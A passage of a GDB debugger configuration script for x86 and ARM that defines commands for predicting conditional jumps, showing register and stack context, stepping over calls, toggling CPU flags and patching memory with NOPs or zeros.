        # $_t_flag == 1 => Thumb or ThumbEE
        # State bit (T), bit 5
        if (($cpsr >> 5) & 1)
            set $_t_flag = 1
        else
            set $_t_flag = 0
        end

        if $_t_flag == 0
	        set $_lastbyte = *(unsigned char *)($pc+3)
	        #set $_bit31 = ($_lastbyte >> 7) & 1
        	#set $_bit30 = ($_lastbyte >> 6) & 1
    	    #set $_bit29 = ($_lastbyte >> 5) & 1
    	    #set $_bit28 = ($_lastbyte >> 4) & 1
    	    set $_conditional = $_lastbyte >> 4
        	dumpjumphelper
        else
        	# if bits 15-12 (opcode in Thumb instructions) are equal to 1 1 0 1 (0xD) then we have a conditional branch
        	# bits 11-8 for the conditional execution code (check ARMv7 manual A8.3)
        	if ( (*(unsigned char *)($pc+1) >> 4) == 0xD )
	        	set $_conditional = *(unsigned char *)($pc+1) ^ 0xD0
        		dumpjumphelper
        	end
        end
##################### X86
    else
        ## grab the first two bytes from the instruction so we can determine the jump instruction
        set $_byte1 = *(unsigned char *)$pc
        set $_byte2 = *(unsigned char *)($pc+1)
        ## and now check what kind of jump we have (in case it's a jump instruction)
        ## I changed the flags routine to save the flag into a variable, so we don't need to repeat the process :) (search for "define flags")

        ## opcode 0x77: JA, JNBE (jump if CF=0 and ZF=0)
        ## opcode 0x0F87: JNBE, JA
        if ( ($_byte1 == 0x77) || ($_byte1 == 0x0F && $_byte2 == 0x87) )
         	# cf=0 and zf=0
 	        if ($_cf_flag == 0 && $_zf_flag == 0)
	        	color $RED
           		printf "  Jump is taken (c=0 and z=0)"
          	else
            	# cf != 0 or zf != 0
           		color $RED
           		printf "  Jump is NOT taken (c!=0 or z!=0)"
          	end
        end
        ## opcode 0x73: JAE, JNB, JNC (jump if CF=0)
        ## opcode 0x0F83: JNC, JNB, JAE (jump if CF=0)
        if ( ($_byte1 == 0x73) || ($_byte1 == 0x0F && $_byte2 == 0x83) )
         	# cf=0
         	if ($_cf_flag == 0)
		        color $RED
           		printf "  Jump is taken (c=0)"
          	else
            	# cf != 0
           		color $RED
   		        printf "  Jump is NOT taken (c!=0)"
          	end
        end
        ## opcode 0x72: JB, JC, JNAE (jump if CF=1)
        ## opcode 0x0F82: JNAE, JB, JC
        if ( ($_byte1 == 0x72) || ($_byte1 == 0x0F && $_byte2 == 0x82) )
            # cf=1
 	        if ($_cf_flag == 1)
		        color $RED
        		printf "  Jump is taken (c=1)"
          	else
            	# cf != 1
           		color $RED
   		        printf "  Jump is NOT taken (c!=1)"
          	end
        end
        ## opcode 0x76: JBE, JNA (jump if CF=1 or ZF=1)
        ## opcode 0x0F86: JBE, JNA
        if ( ($_byte1 == 0x76) || ($_byte1 == 0x0F && $_byte2 == 0x86) )
         	# cf=1 or zf=1
         	if (($_cf_flag == 1) || ($_zf_flag == 1))
		        color $RED
           		printf "  Jump is taken (c=1 or z=1)"
          	else
            	# cf != 1 or zf != 1
           		color $RED
           		printf "  Jump is NOT taken (c!=1 or z!=1)"
          	end
        end
        ## opcode 0xE3: JCXZ, JECXZ, JRCXZ (jump if CX=0 or ECX=0 or RCX=0)
        if ($_byte1 == 0xE3)
         	# cx=0 or ecx=0
         	if (($ecx == 0) || ($cx == 0))
        		color $RED
   		        printf "  Jump is taken (cx=0 or ecx=0)"
          	else
   	    	    color $RED
       	    	printf "  Jump is NOT taken (cx!=0 or ecx!=0)"
          	end
        end
        ## opcode 0x74: JE, JZ (jump if ZF=1)
        ## opcode 0x0F84: JZ, JE, JZ (jump if ZF=1)
        if ( ($_byte1 == 0x74) || ($_byte1 == 0x0F && $_byte2 == 0x84) )
             # ZF = 1
          	if ($_zf_flag == 1)
   		        color $RED
           		printf "  Jump is taken (z=1)"
          	else
                # ZF = 0
           		color $RED
   		        printf "  Jump is NOT taken (z!=1)"
          	end
        end
        ## opcode 0x7F: JG, JNLE (jump if ZF=0 and SF=OF)
        ## opcode 0x0F8F: JNLE, JG (jump if ZF=0 and SF=OF)
        if ( ($_byte1 == 0x7F) || ($_byte1 == 0x0F && $_byte2 == 0x8F) )
            # zf = 0 and sf = of
  	        if (($_zf_flag == 0) && ($_sf_flag == $_of_flag))
   		        color $RED
   		        printf "  Jump is taken (z=0 and s=o)"
         	else
   		        color $RED
   		        printf "  Jump is NOT taken (z!=0 or s!=o)"
  	        end
        end
        ## opcode 0x7D: JGE, JNL (jump if SF=OF)
        ## opcode 0x0F8D: JNL, JGE (jump if SF=OF)
        if ( ($_byte1 == 0x7D) || ($_byte1 == 0x0F && $_byte2 == 0x8D) )
            # sf = of
  	        if ($_sf_flag == $_of_flag)
   		        color $RED
   		        printf "  Jump is taken (s=o)"
  	        else
   		        color $RED
   		        printf "  Jump is NOT taken (s!=o)"
  	        end
        end
        ## opcode: 0x7C: JL, JNGE (jump if SF != OF)
        ## opcode: 0x0F8C: JNGE, JL (jump if SF != OF)
        if ( ($_byte1 == 0x7C) || ($_byte1 == 0x0F && $_byte2 == 0x8C) )
            # sf != of
  	        if ($_sf_flag != $_of_flag)
   		        color $RED
   		        printf "  Jump is taken (s!=o)"
  	        else
        		color $RED
   		        printf "  Jump is NOT taken (s=o)"
  	        end
        end
        ## opcode 0x7E: JLE, JNG (jump if ZF = 1 or SF != OF)
        ## opcode 0x0F8E: JNG, JLE (jump if ZF = 1 or SF != OF)
        if ( ($_byte1 == 0x7E) || ($_byte1 == 0x0F && $_byte2 == 0x8E) )
            # zf = 1 or sf != of
        	if (($_zf_flag == 1) || ($_sf_flag != $_of_flag))
   	        	color $RED
   		        printf "  Jump is taken (zf=1 or sf!=of)"
  	        else
   		        color $RED
   	        	printf "  Jump is NOT taken (zf!=1 or sf=of)"
  	        end
        end
        ## opcode 0x75: JNE, JNZ (jump if ZF = 0)
        ## opcode 0x0F85: JNE, JNZ (jump if ZF = 0)
        if ( ($_byte1 == 0x75) || ($_byte1 == 0x0F && $_byte2 == 0x85) )
            # ZF = 0
  	        if ($_zf_flag == 0)
   		        color $RED
        		printf "  Jump is taken (z=0)"
  	        else
                # ZF = 1
   		        color $RED
   	        	printf "  Jump is NOT taken (z!=0)"
  	        end
        end
        ## opcode 0x71: JNO (OF = 0)
        ## opcode 0x0F81: JNO (OF = 0)
        if ( ($_byte1 == 0x71) || ($_byte1 == 0x0F && $_byte2 == 0x81) )
            # OF = 0
	        if ($_of_flag == 0)
   		        color $RED
   	        	printf "  Jump is taken (o=0)"
	        else
                # OF != 0
           		color $RED
           		printf "  Jump is NOT taken (o!=0)"
          	end
        end
        ## opcode 0x7B: JNP, JPO (jump if PF = 0)
        ## opcode 0x0F8B: JPO (jump if PF = 0)
        if ( ($_byte1 == 0x7B) || ($_byte1 == 0x0F && $_byte2 == 0x8B) )
             # PF = 0
          	if ($_pf_flag == 0)
           		color $RED
           		printf "  Jump is NOT taken (p=0)"
          	else
                # PF != 0
           		color $RED
   		        printf "  Jump is taken (p!=0)"
          	end
        end
        ## opcode 0x79: JNS (jump if SF = 0)
        ## opcode 0x0F89: JNS (jump if SF = 0)
        if ( ($_byte1 == 0x79) || ($_byte1 == 0x0F && $_byte2 == 0x89) )
             # SF = 0
          	if ($_sf_flag == 0)
   		        color $RED
           		printf "  Jump is taken (s=0)"
          	else
                 # SF != 0
           		color $RED
   		        printf "  Jump is NOT taken (s!=0)"
          	end
        end
        ## opcode 0x70: JO (jump if OF=1)
        ## opcode 0x0F80: JO (jump if OF=1)
        if ( ($_byte1 == 0x70) || ($_byte1 == 0x0F && $_byte2 == 0x80) )
             # OF = 1
        	if ($_of_flag == 1)
        		color $RED
   		        printf "  Jump is taken (o=1)"
          	else
                # OF != 1
           		color $RED
   		        printf "  Jump is NOT taken (o!=1)"
          	end
        end
        ## opcode 0x7A: JP, JPE (jump if PF=1)
        ## opcode 0x0F8A: JP, JPE (jump if PF=1)
        if ( ($_byte1 == 0x7A) || ($_byte1 == 0x0F && $_byte2 == 0x8A) )
            # PF = 1
          	if ($_pf_flag == 1)
   		        color $RED
           		printf "  Jump is taken (p=1)"
          	else
                 # PF = 0
           		color $RED
   		        printf "  Jump is NOT taken (p!=1)"
          	end
        end
        ## opcode 0x78: JS (jump if SF=1)
        ## opcode 0x0F88: JS (jump if SF=1)
        if ( ($_byte1 == 0x78) || ($_byte1 == 0x0F && $_byte2 == 0x88) )
             # SF = 1
        	if ($_sf_flag == 1)
   		        color $RED
           		printf "  Jump is taken (s=1)"
          	else
                 # SF != 1
           		color $RED
           		printf "  Jump is NOT taken (s!=1)"
          	end
        end
    end
end
document dumpjump
Syntax: dumpjump
| Display if conditional jump will be taken or not.
end

define dumpjumphelper
    # 0000 - EQ: Z == 1
    if ($_conditional == 0x0)
	    if ($_z_flag == 1)
		    color $RED
    		printf " Jump is taken (z==1)"
    	else
	    	color $RED
    		printf " Jump is NOT taken (z!=1)"
    	end
    end
    # 0001 - NE: Z == 0
    if ($_conditional == 0x1)
	    if ($_z_flag == 0)
		    color $RED
    		printf " Jump is taken (z==0)"
	    else
		    color $RED
    		printf " Jump is NOT taken (z!=0)"
	    end
    end
    # 0010 - CS: C == 1
    if ($_conditional == 0x2)
	    if ($_c_flag == 1)
		    color $RED
    		printf " Jump is taken (c==1)"
	    else
		    color $RED
    		printf " Jump is NOT taken (c!=1)"
	    end
    end
    # 0011 - CC: C == 0
    if ($_conditional == 0x3)
	    if ($_c_flag == 0)
		    color $RED
    		printf " Jump is taken (c==0)"
	    else
		    color $RED
    		printf " Jump is NOT taken (c!=0)"
	    end
    end
    # 0100 - MI: N == 1
    if ($_conditional == 0x4)
	    if ($_n_flag == 1)
		    color $RED
	    	printf " Jump is taken (n==1)"
    	else
		    color $RED
    		printf " Jump is NOT taken (n!=1)"
	    end
    end
    # 0101 - PL: N == 0
    if ($_conditional == 0x5)
	    if ($_n_flag == 0)
		    color $RED
    		printf " Jump is taken (n==0)"
	    else
		    color $RED
    		printf " Jump is NOT taken (n!=0)"
	    end
    end
    # 0110 - VS: V == 1
    if ($_conditional == 0x6)
	    if ($_v_flag == 1)
		    color $RED
    		printf " Jump is taken (v==1)"
	    else
		    color $RED
    		printf " Jump is NOT taken (v!=1)"
	    end
    end
    # 0111 - VC: V == 0
    if ($_conditional == 0x7)
	    if ($_v_flag == 0)
		    color $RED
        	printf " Jump is taken (v==0)"
    	else
	    	color $RED
    		printf " Jump is NOT taken (v!=0)"
	    end
    end
    # 1000 - HI: C == 1 and Z == 0
    if ($_conditional == 0x8)
	    if ($_c_flag == 1 && $_z_flag == 0)
		    color $RED
        	printf " Jump is taken (c==1 and z==0)"
    	else
	    	color $RED
    		printf " Jump is NOT taken (c!=1 or z!=0)"
    	end
    end
    # 1001 - LS: C == 0 or Z == 1
    if ($_conditional == 0x9)
	    if ($_c_flag == 0 || $_z_flag == 1)
		    color $RED
    		printf " Jump is taken (c==0 or z==1)"
	    else
    		color $RED
    		printf " Jump is NOT taken (c!=0 or z!=1)"
	    end
    end
    # 1010 - GE: N == V
    if ($_conditional == 0xA)
	    if ($_n_flag == $_v_flag)
		    color $RED
        	printf " Jump is taken (n==v)"
    	else
	    	color $RED
    		printf " Jump is NOT taken (n!=v)"
    	end
    end
    # 1011 - LT: N != V
    if ($_conditional == 0xB)
	    if ($_n_flag != $_v_flag)
		    color $RED
    		printf " Jump is taken (n!=v)"
	    else
		    color $RED
    		printf " Jump is NOT taken (n==v)"
	    end
    end
    # 1100 - GT: Z == 0 and N == V
    if ($_conditional == 0xC)
	    if ($_z_flag == 0 && $_n_flag == $_v_flag)
		    color $RED
    		printf " Jump is taken (z==0 and n==v)"
	    else
		    color $RED
    		printf " Jump is NOT taken (z!=0 or n!=v)"
	    end
    end
    # 1101 - LE: Z == 1 or N != V
    if ($_conditional == 0xD)
	    if ($_z_flag == 1 || $_n_flag != $_v_flag)
		    color $RED
    		printf " Jump is taken (z==1 or n!=v)"
	    else
		    color $RED
    		printf " Jump is NOT taken (z!=1 or n==v)"
	    end
    end
end
document dumpjumphelper
Syntax: dumpjumphelper
| Helper function to decide if conditional jump will be taken or not, for ARM and Thumb.
end


# _______________process context______________
# initialize variable
set $displayobjectivec = 0

define context
    color $COLOR_SEPARATOR
    if $SHOWCPUREGISTERS == 1
	    printf "----------------------------------------"
	    printf "----------------------------------"
	    if ($64BITS == 1)
	        printf "---------------------------------------------"
	    end
	    color $COLOR_SEPARATOR
	    color_bold
	    printf "[regs]\n"
	    color_reset
	    reg
	    color $CYAN
    end
    if $SHOWSTACK == 1
    	color $COLOR_SEPARATOR
		if $ARM == 1
       printf "[0x%08X]", $sp
		else
        if ($64BITS == 1)
		        printf "[0x%04X:0x%016lX]", $ss, $rsp
        else
            printf "[0x%04X:0x%08X]", $ss, $esp
        end
    end
        color $COLOR_SEPARATOR
		printf "-------------------------"
    	printf "-----------------------------"
	    if ($64BITS == 1)
	        printf "-------------------------------------"
	    end
	    color $COLOR_SEPARATOR
	    color_bold
	    printf "[stack]\n"
    	color_reset
    	set $context_i = $CONTEXTSIZE_STACK
    	while ($context_i > 0)
       	    set $context_t = $sp + 0x10 * ($context_i - 1)
       	    hexdump $context_t
       	    set $context_i--
    	end
    end
    # show the objective C message being passed to msgSend
    if $SHOWOBJECTIVEC == 1
        #FIXME: X64 and ARM
        # What a piece of crap that's going on here :)
        # detect if it's the correct opcode we are searching for
        if $ARM == 0
            set $__byte1 = *(unsigned char *)$pc
    	    set $__byte = *(int *)$pc
        	if ($__byte == 0x4244489)
          		set $objectivec = $eax
      	    	set $displayobjectivec = 1
    	    end

        	if ($__byte == 0x4245489)
         		set $objectivec = $edx
     	    	set $displayobjectivec = 1
    	    end

        	if ($__byte == 0x4244c89)
         		set $objectivec = $ecx
     	    	set $displayobjectivec = 1
        	end
        else
            set $__byte1 = 0
        end
        # and now display it or not (we have no interest in having the info displayed after the call)
        if $__byte1 == 0xE8
            if $displayobjectivec == 1
                color $COLOR_SEPARATOR
                printf "--------------------------------------------------------------------"
                if ($64BITS == 1)
                    printf "---------------------------------------------"
                end
                color $COLOR_SEPARATOR
                color_bold
	    		printf "[ObjectiveC]\n"
	    		color_reset
      	    	color $BLACK
      		    x/s $objectivec
         	end
         	set $displayobjectivec = 0
        end
        if $displayobjectivec == 1
            color $COLOR_SEPARATOR
          	printf "--------------------------------------------------------------------"
          	if ($64BITS == 1)
	            printf "---------------------------------------------"
    	    end
    	    color $COLOR_SEPARATOR
    	    color_bold
		    printf "[ObjectiveC]\n"
		    color_reset
          	color $BLACK
          	x/s $objectivec
        end
    end
    color_reset
# and this is the end of this little crap

    if $SHOWDATAWIN == 1
        datawin
    end

    color $COLOR_SEPARATOR
    printf "--------------------------------------------------------------------------"
    if ($64BITS == 1)
	    printf "---------------------------------------------"
	end
	color $COLOR_SEPARATOR
	color_bold
    printf "[code]\n"
    color_reset
    set $context_i = $CONTEXTSIZE_CODE
    if ($context_i > 0)
        if ($SETCOLOR1STLINE == 1)
	        color $GREEN
            if ($ARM == 1)
                #       | $cpsr.t (Thumb flag)
                x/i (unsigned int)$pc | (($cpsr >> 5) & 1)
            else
    	        x/i $pc
            end
	        color_reset
	    else
            if ($ARM == 1)
                #       | $cpsr.t (Thumb flag)
	              x/i (unsigned int)$pc | (($cpsr >> 5) & 1)
            else
                x/i $pc
            end
	    end
        set $context_i--
    end
    while ($context_i > 0)
        x /i
        set $context_i--
    end
    color $COLOR_SEPARATOR
    printf "----------------------------------------"
    printf "----------------------------------------"
    if ($64BITS == 1)
        printf "---------------------------------------------\n"
	else
	    printf "\n"
	end
    color_reset
end
document context
Syntax: context
| Print context window, i.e. regs, stack, ds:esi and disassemble cs:eip.
end


define context-on
    set $SHOW_CONTEXT = 1
    printf "Displaying of context is now ON\n"
end
document context-on
Syntax: context-on
| Enable display of context on every program break.
end


define context-off
    set $SHOW_CONTEXT = 0
    printf "Displaying of context is now OFF\n"
end
document context-off
Syntax: context-off
| Disable display of context on every program break.
end


# _______________process control______________
define n
    if $argc == 0
        nexti
    end
    if $argc == 1
        nexti $arg0
    end
    if $argc > 1
        help n
    end
end
document n
Syntax: n <NUM>
| Step one instruction, but proceed through subroutine calls.
| If NUM is given, then repeat it NUM times or till program stops.
| This is alias for nexti.
end


define go
    if $argc == 0
        stepi
    end
    if $argc == 1
        stepi $arg0
    end
    if $argc > 1
        help go
    end
end
document go
Syntax: go <NUM>
| Step one instruction exactly.
| If NUM is given, then repeat it NUM times or till program stops.
| This is alias for stepi.
end


define pret
    finish
end
document pret
Syntax: pret
| Execute until selected stack frame returns (step out of current call).
| Upon return, the value returned is printed and put in the value history.
end


define init
    set $SHOW_NEST_INSN = 0
    tbreak _init
    r
end
document init
Syntax: init
| Run program and break on _init().
end


define start
    set $SHOW_NEST_INSN = 0
    tbreak _start
    r
end
document start
Syntax: start
| Run program and break on _start().
end


define sstart
    set $SHOW_NEST_INSN = 0
    tbreak __libc_start_main
    r
end
document sstart
Syntax: sstart
| Run program and break on __libc_start_main().
| Useful for stripped executables.
end


define main
    set $SHOW_NEST_INSN = 0
    tbreak main
    r
end
document main
Syntax: main
| Run program and break on main().
end


# FIXME64
#### WARNING ! WARNING !!
#### More more messy stuff starting !!!
#### I was thinking about how to do this and then it ocurred me that it could be as simple as this ! :)
define stepoframework
    if $ARM == 1
        # bl and bx opcodes
        # bx Rn  => ARM bits 27-20: 0 0 0 1 0 0 1 0 , bits 7-4: 0 0 0 1 ; Thumb bits: 15-7: 0 1 0 0 0 1 1 1 0
        # blx Rn => ARM bits 27-20: 0 0 0 1 0 0 1 0 , bits 7-4: 0 0 1 1 ; Thumb bits: 15-7: 0 1 0 0 0 1 1 1 1
        # bl # => ARM bits 27-24: 1 0 1 1 ; Thumb bits: 15-11: 1 1 1 1 0
        # blx # => ARM bits 31-25: 1 1 1 1 1 0 1 ; Thumb bits: 15-11: 1 1 1 1 0
        set $_nextaddress = 0

        # ARM Mode
        if ($_t_flag == 0)
        	set $_branchesint = *(unsigned int*)$pc
        	set $_bit31 = ($_branchesint >> 0x1F) & 1
        	set $_bit30 = ($_branchesint >> 0x1E) & 1
        	set $_bit29 = ($_branchesint >> 0x1D) & 1
        	set $_bit28 = ($_branchesint >> 0x1C) & 1
        	set $_bit27 = ($_branchesint >> 0x1B) & 1
        	set $_bit26 = ($_branchesint >> 0x1A) & 1
        	set $_bit25 = ($_branchesint >> 0x19) & 1
        	set $_bit24 = ($_branchesint >> 0x18) & 1
        	set $_bit23 = ($_branchesint >> 0x17) & 1
        	set $_bit22 = ($_branchesint >> 0x16) & 1
        	set $_bit21 = ($_branchesint >> 0x15) & 1
        	set $_bit20 = ($_branchesint >> 0x14) & 1
        	set $_bit7 = ($_branchesint >> 0x7) & 1
        	set $_bit6 = ($_branchesint >> 0x6) & 1
        	set $_bit5 = ($_branchesint >> 0x5) & 1
        	set $_bit4 = ($_branchesint >> 0x4) & 1

            #	set $_lastbyte = *(unsigned char *)($pc+3)
            #	set $_bits2724 = $_lastbyte & 0x1
            #	set $_bits3128 = $_lastbyte >> 4
            #	if ($_bits3128 == 0xF)
            #		set $_bits2724 = $_lastbyte & 0xA
            #		set $_bits2724 = $_bits2724 >> 1
            #	end
            #	set $_previousbyte = *(unsigned char *)($pc+2)
            #	set $_bits2320 = $_previousbyte >> 4
            #	printf "bits2724: %x bits2320: %x\n", $_bits2724, $_bits2320

        	if ($_bit27 == 0 && $_bit26 == 0 && $_bit25 == 0 && $_bit24 == 1 && $_bit23 == 0 && $_bit22 == 0 && $_bit21 == 1 && $_bit20 == 0 && $_bit7 == 0 && $_bit6 == 0 && $_bit5 == 0 && $_bit4 == 1)
		        printf "Found a bx Rn\n"
        		set $_nextaddress = $pc+0x4
        	end
        	if ($_bit27 == 0 && $_bit26 == 0 && $_bit25 == 0 && $_bit24 == 1 && $_bit23 == 0 && $_bit22 == 0 && $_bit21 == 1 && $_bit20 == 0 && $_bit7 == 0 && $_bit6 == 0 && $_bit5 == 1 && $_bit4 == 1)
		        printf "Found a blx Rn\n"
        		set $_nextaddress = $pc+0x4
        	end
        	if ($_bit27 == 1 && $_bit26 == 0 && $_bit25 == 1 && $_bit24 == 1)
		        printf "Found a bl #\n"
        		set $_nextaddress = $pc+0x4
        	end
        	if ($_bit31 == 1 && $_bit30 == 1 && $_bit29 == 1 && $_bit28 == 1 && $_bit27 == 1 && $_bit26 == 0 && $_bit25 == 1)
		        printf "Found a blx #\n"
        		set $_nextaddress = $pc+0x4
        	end
        # Thumb Mode
        else
            # 32 bits instructions in Thumb are divided into two half words
        	set $_hw1 = *(unsigned short*)($pc)
        	set $_hw2 = *(unsigned short*)($pc+2)

        	# bl/blx (immediate)
        	# hw1: bits 15-11: 1 1 1 1 0
        	# hw2: bits 15-14: 1 1 ; BL bit 12: 1 ; BLX bit 12: 0
        	if ( ($_hw1 >> 0xC) == 0xF && (($_hw1 >> 0xB) & 1) == 0)
		        if ( ((($_hw2 >> 0xF) & 1) == 1) && ((($_hw2 >> 0xE) & 1) == 1) )
        			set $_nextaddress = $pc+0x4
		        end
        	end
        end
        # if we have found a call to bypass we set a temporary breakpoint on next instruction and continue
        if ($_nextaddress != 0)
            tbreak *$_nextaddress
            continue
            printf "[StepO] Next address will be %x\n", $_nextaddress
        # else we just single step
        else
            nexti
        end
###################################### X86
    else
        ## we know that an opcode starting by 0xE8 has a fixed length
        ## for the 0xFF opcodes, we can enumerate what is possible to have
        # first we grab the first 3 bytes from the current program counter
        set $_byte1 = *(unsigned char *)$pc
        set $_byte2 = *(unsigned char *)($pc+1)
        set $_byte3 = *(unsigned char *)($pc+2)
        # and start the fun
        # if it's a 0xE8 opcode, the total instruction size will be 5 bytes
        # so we can simply calculate the next address and use a temporary breakpoint ! Voila :)
        set $_nextaddress = 0
        # this one is the must useful for us !!!
        if ($_byte1 == 0xE8)
            set $_nextaddress = $pc + 0x5
        else
            # just other cases we might be interested in... maybe this should be removed since the 0xE8 opcode is the one we will use more
            # this is a big fucking mess and can be improved for sure :) I don't like the way it is ehehehe
            if ($_byte1 == 0xFF)
                # call *%eax (0xFFD0) || call *%edx (0xFFD2) || call *(%ecx) (0xFFD1) || call (%eax) (0xFF10) || call *%esi (0xFFD6) || call *%ebx (0xFFD3) || call   DWORD PTR [edx] (0xFF12)
                if ($_byte2 == 0xD0 || $_byte2 == 0xD1 || $_byte2 == 0xD2 || $_byte2 == 0xD3 || $_byte2 == 0xD6 || $_byte2 == 0x10 || $_byte2 == 0x11 || $_byte2 == 0xD7 || $_byte2 == 0x12)
                    set $_nextaddress = $pc + 0x2
                end
                # call *0x??(%ebp) (0xFF55??) || call *0x??(%esi) (0xFF56??) || call *0x??(%edi) (0xFF5F??) || call *0x??(%ebx)
                # call *0x??(%edx) (0xFF52??) || call *0x??(%ecx) (0xFF51??) || call *0x??(%edi) (0xFF57??) || call *0x??(%eax) (0xFF50??)
                if ($_byte2 == 0x55 || $_byte2 == 0x56 || $_byte2 == 0x5F || $_byte2 == 0x53 || $_byte2 == 0x52 || $_byte2 == 0x51 || $_byte2 == 0x57 || $_byte2 == 0x50)
                    set $_nextaddress = $pc + 0x3
                end
                # call *0x????????(%ebx) (0xFF93????????) ||
                if ($_byte2 == 0x93 || $_byte2 == 0x94 || $_byte2 == 0x90 || $_byte2 == 0x92 || $_byte2 == 0x95 || $_byte2 == 0x15)
                    set $_nextaddress = $pc + 6
                end
                # call *0x????????(%ebx,%eax,4) (0xFF94??????????)
                if ($_byte2 == 0x94)
                    set $_nextaddress = $pc + 7
                end
            end
            # FIXME: still missing a few?
            if ($_byte1 == 0x41 || $_byte1 == 0x40)
               if ($_byte2 == 0xFF)
                    if ($_byte3 == 0xD0 || $_byte3 == 0xD1 || $_byte3 == 0xD2 || $_byte3 == 0xD3 || $_byte3 == 0xD4 || $_byte3 == 0xD5 ||  $_byte3 == 0xD6 || $_byte3 == 0xD7)
                        set $_nextaddress = $pc + 0x3
                    end
               end
            end
        end
        # if we have found a call to bypass we set a temporary breakpoint on next instruction and continue
        if ($_nextaddress != 0)
            if ($arg0 == 1)
                thbreak *$_nextaddress
            else
                tbreak *$_nextaddress
            end
            continue
            # else we just single step
         else
            nexti
         end
    end
end
document stepoframework
Syntax: stepoframework
| Auxiliary function to stepo command.
end

define stepo
    stepoframework 0
end
document stepo
Syntax: stepo
| Step over calls (interesting to bypass the ones to msgSend).
| This function will set a temporary breakpoint on next instruction after the call so the call will be bypassed.
| You can safely use it instead nexti or n since it will single step code if it's not a call instruction (unless you want to go into the call function).
end


define stepoh
    stepoframework 1
end
document stepoh
Syntax: stepoh
| Same as stepo command but uses temporary hardware breakpoints.
end


# FIXME: ARM
define skip
	x/2i $pc
	set $instruction_size = (int)($_ - $pc)
	set $pc = $pc + $instruction_size
	if ($SKIPEXECUTE == 1)
		if ($SKIPSTEP == 1)
			stepo
		else
			stepi
		end
	else
		context
	end
end
document skip
Syntax: skip
| Skip over the instruction located at EIP/RIP. By default, the instruction will not be executed!
| Some configurable options are available on top of gdbinit to override this.
end


# _______________eflags commands______________
# conditional flags are
# negative/less than (N), bit 31 of CPSR
# zero (Z), bit 30
# Carry/Borrow/Extend (C), bit 29
# Overflow (V), bit 28

# negative/less than (N), bit 31 of CPSR
define cfn
    if $ARM == 1
    	set $tempflag = $cpsr->n
        if ($tempflag & 1)
            set $cpsr->n = $tempflag&~0x1
        else
            set $cpsr->n = $tempflag|0x1
        end
    end
end
document cfn
Syntax: cfn
| Change Negative/Less Than Flag.
end


define cfc
# Carry/Borrow/Extend (C), bit 29
    if $ARM == 1
	    set $tempflag = $cpsr->c
        if ($tempflag & 1)
            set $cpsr->c = $tempflag&~0x1
        else
            set $cpsr->c = $tempflag|0x1
        end
     else
        if ((unsigned int)$eflags & 1)
            set $eflags = (unsigned int)$eflags&~0x1
        else
            set $eflags = (unsigned int)$eflags|0x1
        end
     end
end
document cfc
Syntax: cfc
| Change Carry Flag.
end


define cfp
    if (((unsigned int)$eflags >> 2) & 1)
        set $eflags = (unsigned int)$eflags&~0x4
    else
        set $eflags = (unsigned int)$eflags|0x4
    end
end
document cfp
Syntax: cfp
| Change Parity Flag.
end


define cfa
    if (((unsigned int)$eflags >> 4) & 1)
        set $eflags = (unsigned int)$eflags&~0x10
    else
        set $eflags = (unsigned int)$eflags|0x10
    end
end
document cfa
Syntax: cfa
| Change Auxiliary Carry Flag.
end


define cfz
# zero (Z), bit 30
    if $ARM == 1
 	    set $tempflag = $cpsr->z
        if ($tempflag & 1)
            set $cpsr->z = $tempflag&~0x1
        else
            set $cpsr->z = $tempflag|0x1
        end
     else
        if (((unsigned int)$eflags >> 6) & 1)
            set $eflags = (unsigned int)$eflags&~0x40
        else
            set $eflags = (unsigned int)$eflags|0x40
        end
     end
end
document cfz
Syntax: cfz
| Change Zero Flag.
end


define cfs
    if (((unsigned int)$eflags >> 7) & 1)
        set $eflags = (unsigned int)$eflags&~0x80
    else
        set $eflags = (unsigned int)$eflags|0x80
    end
end
document cfs
Syntax: cfs
| Change Sign Flag.
end


define cft
    if (((unsigned int)$eflags >>8) & 1)
        set $eflags = (unsigned int)$eflags&~0x100
    else
        set $eflags = (unsigned int)$eflags|0x100
    end
end
document cft
Syntax: cft
| Change Trap Flag.
end


define cfi
    if (((unsigned int)$eflags >> 9) & 1)
        set $eflags = (unsigned int)$eflags&~0x200
    else
        set $eflags = (unsigned int)$eflags|0x200
    end
end
document cfi
Syntax: cfi
| Change Interrupt Flag.
| Only privileged applications (usually the OS kernel) may modify IF.
| This only applies to protected mode (real mode code may always modify IF).
end


define cfd
    if (((unsigned int)$eflags >>0xA) & 1)
        set $eflags = (unsigned int)$eflags&~0x400
    else
        set $eflags = (unsigned int)$eflags|0x400
    end
end
document cfd
Syntax: cfd
| Change Direction Flag.
end


define cfo
    if (((unsigned int)$eflags >> 0xB) & 1)
        set $eflags = (unsigned int)$eflags&~0x800
    else
        set $eflags = (unsigned int)$eflags|0x800
    end
end
document cfo
Syntax: cfo
| Change Overflow Flag.
end


# Overflow (V), bit 28
define cfv
    if $ARM == 1
    	set $tempflag = $cpsr->v
        if ($tempflag & 1)
            set $cpsr->v = $tempflag&~0x1
        else
            set $cpsr->v = $tempflag|0x1
        end
    end
end
document cfv
Syntax: cfv
| Change Overflow Flag.
end


# ____________________patch___________________
# the usual nops are mov r0,r0 for arm (0xe1a00000)
# and mov r8,r8 in Thumb (0x46c0)
# armv7 has other nops
# FIXME: make sure that the interval fits the 32bits address for arm and 16bits for thumb
# status: works, fixme
define nop
    if ($argc > 2 || $argc == 0)
        help nop
    end

    if $ARM == 1
        if ($argc == 1)
            if ($cpsr->t &1)
                # thumb
                set *(short *)$arg0 = 0x46c0
            else
                # arm
                set *(int *)$arg0 = 0xe1a00000
            end
        else
        	set $addr = $arg0
        	if ($cpsr->t & 1)
    	    	# thumb
			    while ($addr < $arg1)
				    set *(short *)$addr = 0x46c0
				    set $addr = $addr + 2
		    	end
	    	else
		    	# arm
		    	while ($addr < $arg1)
			    	set *(int *)$addr = 0xe1a00000
			    	set $addr = $addr + 4
			    end
		    end
        end
    else
        if ($argc == 1)
    	    set *(unsigned char *)$arg0 = 0x90
        else
        	set $addr = $arg0
    	    while ($addr < $arg1)
	    	    set *(unsigned char *)$addr = 0x90
	    	    set $addr = $addr + 1
    	    end
        end
    end
end
document nop
Syntax: nop ADDR1 [ADDR2]
| Patch a single byte at address ADDR1, or a series of bytes between ADDR1 and ADDR2 to a NOP (0x90) instruction.
| ARM or Thumb code will be patched accordingly.
end


define null
    if ( $argc >2 || $argc == 0)
        help null
    end

    if ($argc == 1)
	    set *(unsigned char *)$arg0 = 0
    else
	    set $addr = $arg0
    	while ($addr < $arg1)
	        set *(unsigned char *)$addr = 0
		    set $addr = $addr +1
	    end
    end
end
document null
Syntax: null ADDR1 [ADDR2]
